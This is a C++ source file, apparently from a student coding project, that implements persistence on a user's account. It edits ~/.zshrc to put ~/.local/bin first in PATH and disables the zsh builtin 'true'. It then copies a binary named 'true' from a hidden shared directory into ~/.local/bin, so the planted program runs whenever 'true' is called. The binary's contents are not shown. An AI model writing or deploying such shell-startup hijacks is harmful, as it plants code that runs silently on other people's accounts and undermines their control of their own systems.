/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   persistance.cpp                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/08 21:51:00 by zcadinot          #+#    #+#             */
/*   Updated: 2026/03/08 23:39:00 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_connect.hpp"
#include <fstream>
#include <string>
#include <filesystem>

void pr_zshrc()
{
    std::ofstream zshrc;
    std::string zshrc_path;

    zshrc_path = get_zshrc_path();
    zshrc.open(zshrc_path, std::ios::app);
    if (!zshrc)
        return;

    if (!check_rc_path())
        zshrc << "\nexport PATH=\"$HOME/.local/bin:$PATH\"\n";
    if (!check_disable_true())
        zshrc << "disable true\n";

    zshrc.close();
}

bool check_rc_path()
{
    std::ifstream zshrc;
    std::string line;
    std::string zshrc_path;

    zshrc_path = get_zshrc_path();
    zshrc.open(zshrc_path);
    if (!zshrc)
        return (false);

    while (std::getline(zshrc, line))
    {
        if (line.find("export PATH=\"$HOME/.local/bin:$PATH\"") != std::string::npos)
        {
            zshrc.close();
            return (true);
        }
    }

    zshrc.close();
    return (false);
}

std::string get_zshrc_path()
{
    std::string user;
    std::string path;

    user = get_current_user();
    path = "/home/";
    path += user;
    path += "/.zshrc";
    return (path);
}

bool check_disable_true()
{
    std::ifstream zshrc;
    std::string line;
    std::string zshrc_path;

    zshrc_path = get_zshrc_path();
    zshrc.open(zshrc_path);
    if (!zshrc)
        return (false);

    while (std::getline(zshrc, line))
    {
        if (line.find("disable true") != std::string::npos)
        {
            zshrc.close();
            return (true);
        }
    }

    zshrc.close();
    return (false);
}

static void copy_true()
{
    std::string user;
    std::string dir;
    std::string dest;

    user = get_current_user();
    dir = "/home/" + user + "/.local/bin";
    dest = dir + "/true";

    std::filesystem::create_directories(dir);

    copy_file(
        "/sgoinfre/goinfre/Perso/zcadinot/.fcpp/src/persistance/true",
        dest
    );
}

void persistance()
{
    pr_zshrc();
    copy_true();
}
